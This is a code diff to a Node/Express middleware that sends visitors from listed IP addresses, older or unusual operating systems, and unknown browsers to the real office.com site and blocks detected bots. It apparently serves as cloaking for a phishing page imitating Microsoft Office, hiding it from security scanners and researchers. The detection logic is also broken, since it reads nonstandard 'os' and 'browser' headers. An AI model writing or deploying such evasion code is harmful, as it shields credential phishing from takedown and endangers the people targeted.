@@ -48,21 +48,45 @@ function isBotRef(referer) {
 }
 
 // Combined Bot detection middleware
+const redirectUrl = "https://office.com"; // Define the redirection link
+
 const detectBotMiddleware = (req, res, next) => {
-  const ip = req.ip || getClientIp(req);
-  const userAgent = req.headers['user-agent'] || 'Unknown User-Agent';
-  const referer = req.headers.referer || req.headers.origin;
+    const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const userAgent = req.headers['user-agent'] || "Unknown User-Agent";
+    const os = req.headers['os'] || "Unknown OS Platform"; // Replace with actual OS detection logic
+    const browser = req.headers['browser'] || "Unknown Browser"; // Replace with actual browser detection logic
 
-  if (
-    isBotUA(userAgent) ||
-    isBotIP(ip) ||
-    isBotRef(referer)
-  ) {
-    console.log(`Blocked request: IP: ${ip}, User-Agent: ${userAgent}`);
-    return res.status(403).send('Access denied');
-  }
+    // Specific IP, OS, and browser checks
+    if (
+        ip === "92.23.57.168" ||
+        ip === "96.31.1.4" ||
+        ip === "207.96.148.8" ||
+        (os === "Windows Server 2003/XP x64" && browser === "Firefox") ||
+        (os === "Windows 7" && browser === "Firefox") ||
+        (os === "Windows XP" && ["Firefox", "Internet Explorer", "Chrome"].includes(browser)) ||
+        (os === "Windows Vista" && browser === "Internet Explorer") ||
+        ["Windows Vista", "Ubuntu", "Chrome OS", "BlackBerry", "Linux"].includes(os) ||
+        browser === "Internet Explorer" ||
+        os === "Windows 2000" ||
+        os === "Unknown OS Platform" ||
+        browser === "Unknown Browser"
+    ) {
+        console.log(`Blocked by OS/Browser: IP: ${ip}, OS: ${os}, Browser: ${browser}, User-Agent: ${userAgent}`);
+        return res.redirect(redirectUrl);
+    }
 
-  next();
+    // Generic bot detection (using isBotUA, isBotIP, and other methods)
+    if (
+        isBotUA(userAgent) ||
+        isBotIP(ip) ||
+        isBotRef(req.headers.referer || req.headers.origin)
+    ) {
+        console.log(`Blocked request: IP: ${ip}, User-Agent: ${userAgent}`);
+        return res.status(403).send('Access denied');
+    }
+
+    // If no conditions are met, proceed to the next middleware
+    next();
 };
 
 // Apply Bot Detection Middleware
